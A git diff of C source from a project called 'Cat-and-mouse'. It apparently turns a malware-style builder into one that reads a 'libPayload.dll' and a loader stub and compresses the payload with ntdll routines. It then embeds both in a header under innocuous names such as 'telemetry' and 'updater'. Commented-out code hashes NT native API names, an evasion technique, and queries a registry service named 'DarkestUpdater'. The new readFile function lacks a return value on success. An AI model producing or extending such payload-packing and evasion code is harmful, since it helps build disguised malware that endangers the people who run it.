@@ -2,9 +2,13 @@
 // Created by mikul on 05.01.2026.
 //
 
-#include <windows.h>
-#include <winternl.h>
+//#include <windows.h>
+//#include <winternl.h>
+//#include <stdio.h>
+
 #include <stdio.h>
+#include <windows.h>
+#include "ntlib.h"
 #include "library.h"
 
 typedef NTSTATUS (NTAPI *_RtlGetCompressionWorkSpaceSize)(USHORT, PULONG, PULONG);
@@ -44,7 +48,7 @@ NTSTATUS GetCompressedBuffer(PUCHAR srcBuf, ULONG srcSize, PUCHAR* outBuf, PULON
 }
 
 int GenerateHeaderFile(const char* filename, const char* arrayName, PUCHAR data, ULONG len, ULONG originalLen) {
-    FILE* hFile = fopen(filename, "w");
+    FILE* hFile = fopen(filename, "a");
     if (!hFile) return -1;
 
     fprintf(hFile, "#pragma once\n\n");
@@ -67,11 +71,8 @@ int GenerateHeaderFile(const char* filename, const char* arrayName, PUCHAR data,
     return 0;
 }
 
-int main() {
-    const char * inputFileName = "C:\\Users\\mikul\\Cat-and-mouse\\cmake-build-debug\\libCat_and_mouse_updater.dll";
-    const char * outputPath = "C:\\Users\\mikul\\Cat-and-mouse\\updater.h";
-
-    FILE *inFile = fopen(inputFileName, "rb");
+int readFile(const char * path, __out PUCHAR * outBuffer, __out ULONG * size) {
+    FILE *inFile = fopen(path, "rb");
     if (!inFile) {
         printf("Error: Could not open input file.\n");
         return -1;
@@ -84,17 +85,62 @@ int main() {
     fread(buffer, sizeof(char), fileSize, inFile);
     fclose(inFile);
 
+    *outBuffer = buffer;
+    *size = fileSize;
+}
+
+API_TABLE api;
+
+int main() {
+    /*
+    const char *api_names[] = {
+        "NtCreateKey", "NtSetValueKey", "NtQueryValueKey", "NtClose",
+        "NtOpenKey", "NtWriteFile", "NtCreateFile", "RtlDecompressBuffer",
+        "NtAllocateVirtualMemory", "NtFreeVirtualMemory", "RtlCopyMemory"
+    };
+
+    for (size_t i = 0; i < sizeof(api_names) / sizeof(api_names[0]); i++) {
+        uint64_t hash = siphash24(api_names[i], strlen(api_names[i]), key);
+        printf("0x%016llX, // %s\n", (unsigned long long)hash, api_names[i]);
+    }
+
+
+    HMODULE hModule = GetLibraryBase(L"ntdll.dll");
+    ArchiveNativeAPIs(hModule, &api);
+    void *pointer = QueryRegistryKey(
+        nullptr, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\DarkestUpdater", L"ImagePath", &api);
+    return 0;
+    */
+
+    const char * payloadFileName = "C:\\Users\\mikul\\Cat-and-mouse\\cmake-build-debug\\libPayload.dll";
+    const char * stubFileName = "C:\\Users\\mikul\\Cat-and-mouse\\cmake-build-debug\\libLoader.dll";
+
+    const char * outputPath = "C:\\Users\\mikul\\Cat-and-mouse\\updater.h";
+
+    PUCHAR payloadBuff = nullptr;
+    ULONG payloadBuffSize = 0;
+    readFile(payloadFileName, &payloadBuff, &payloadBuffSize);
+
+    PUCHAR stubBuff = nullptr;
+    ULONG stubBuffSize = 0;
+    readFile(stubFileName, &stubBuff, &stubBuffSize);
 
     u_char * comprBuff = nullptr;
     u_long comprBuffSize = 0;
-    NTSTATUS compressionResult = GetCompressedBuffer(buffer, fileSize, &comprBuff, &comprBuffSize);
+    NTSTATUS compressionResult = GetCompressedBuffer(payloadBuff, payloadBuffSize, &comprBuff, &comprBuffSize);
     if (compressionResult != 0) {
         printf("Compression failed.\n");
         return -1;
     }
 
-    GenerateHeaderFile(outputPath, "updaterBin", comprBuff, comprBuffSize, fileSize);
-    free(buffer);
+    GenerateHeaderFile(outputPath, "telemetry", comprBuff, comprBuffSize, payloadBuffSize);
+    GenerateHeaderFile(outputPath, "loader", stubBuff, stubBuffSize, stubBuffSize);
+
     free(comprBuff);
+    free(stubBuff);
+
+
+
+
     return 0;
 }
